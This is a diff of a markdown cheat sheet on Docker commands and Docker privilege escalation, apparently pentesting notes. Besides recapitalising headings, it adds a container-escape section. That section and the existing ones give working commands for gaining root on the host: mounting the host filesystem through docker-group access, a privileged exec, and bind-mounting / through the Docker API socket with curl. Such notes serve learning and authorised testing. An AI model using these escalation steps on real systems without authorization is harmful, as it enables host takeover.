@@ -7,52 +7,57 @@ tags: ["Forensic", "Docker", "Container", "Dive"]
 ### Basic Commands
 
 ```console
-# Show all running processes
+# Show All Running Docker Processes
 sudo docker ps -a
 ```
 
 ```console
-# Show all images
+# Show All Docker Images
 sudo docker images -a
 ```
 
 ```console
-# Stop all processes
+# Stop All Docker Processes
 sudo docker stop $(sudo docker ps -a -q)
 ```
 
 ```console
-# Remove all processes
+# Remove All Docker Processes
 sudo docker rm -vf $(sudo docker ps -a -q)
 ```
 
 ```console
-# Remove all images
+# Remove All Docker Images
 sudo docker rmi -f $(sudo docker images -aq)
 ```
 
 ```console
-# Shell in docker
+# Shell in Container
 sudo docker exec -it <CONTAINER_ID> bash
 ```
 
 ```console
-# Copy file from host to container
+# Privileged Shell in Container
+sudo docker exec -it --privileged --user root <CONTAINER_ID> bash
+```
+
+```console
+# Copy File from Host to Container
 sudo docker cp <HOST_FILE_PATH> <CONTAINER_ID>:<CONTAINER_FILE_PATH>
 ```
 
 ```console
-# Copy file from container to host
+# Copy File from Container to Host
 sudo docker cp <CONTAINER_ID>:<CONTAINER_FILE_PATH> <HOST_FILE_PATH>
 ```
 
 ```console
-# Copy folder from host to container
+# Copy Folder from Host to Container
 sudo docker cp <HOST_FOLDER_PATH>/. <CONTAINER_ID>:<CONTAINER_TARGET_PATH>
 ```
 
 ```console
-# Copy folder from container to host
+# Copy Folder from Container to Host
 sudo docker cp <CONTAINER_ID>:<CONTAINER_FOLDER_PATH>/. <HOST_TARGET_PATH>
 ```
 
@@ -76,7 +81,7 @@ dive docker-archive://image.tar
 ### Abuse #1: Docker group
 
 ```console
-# List images
+# List Docker Images
 docker images
 ```
 
@@ -87,7 +92,7 @@ alpine       latest    d7d3d98c851f   2 years ago   5.53MB
 ```
 
 ```console
-# Mount host root filesystem
+# Mount Host root Filesystem
 docker run -v /:/mnt -it <IMAGE_ID> sh
 ```
 
@@ -108,10 +113,33 @@ root.txt
 
 ---
 
-### Abuse #2: Docker API
+### Abuse #2: Docker Escape (With Root)
 
 ```console
-# Show running containers
+# Take Note of the Host Mount
+mount
+```
+
+```console
+sudo docker exec -it --privileged --user root <CONTAINER_ID> bash
+```
+
+```console
+# Mount Host root Filesystem
+mount /dev/sda1 /mnt
+```
+
+```console
+# Check
+ls /mnt/root
+```
+
+---
+
+### Abuse #3: Docker API
+
+```console
+# Show Running Containers
 curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
 ```
 
@@ -121,7 +149,7 @@ root@2d24bf61767c:/root# curl -s --unix-socket /var/run/docker.sock http://local
 ```
 
 ```console
-# Create container
+# Create Container
 curl -s -X POST -H 'Content-Type: application/json' --data-binary '{"Image": "<IMAGE_NAME>:latest","HostConfig": {"Binds": ["/:/r"]}, "Cmd": ["/bin/sh", "-c", "ls -la /r/root/"], "Tty": true}' --unix-socket /var/run/docker.sock http://localhost/containers/create
 ```
 
@@ -131,7 +159,7 @@ curl -s -X POST -H 'Content-Type: application/json' --data-binary '{"Image": "<I
 ```
 
 ```console
-# Start container
+# Start Container
 curl -i -X POST -H 'Content-Type: application/json' --unix-socket /var/run/docker.sock http://localhost/containers/<CONTAINER_ID>/start
 ```
 
@@ -146,7 +174,7 @@ Date: Mon, 23 Sep 2024 04:29:11 GMT
 ```
 
 ```console
-# Show results
+# Show Results
 curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/<CONTAINER_ID>/logs?stderr=1&stdout=1"
 ```
 
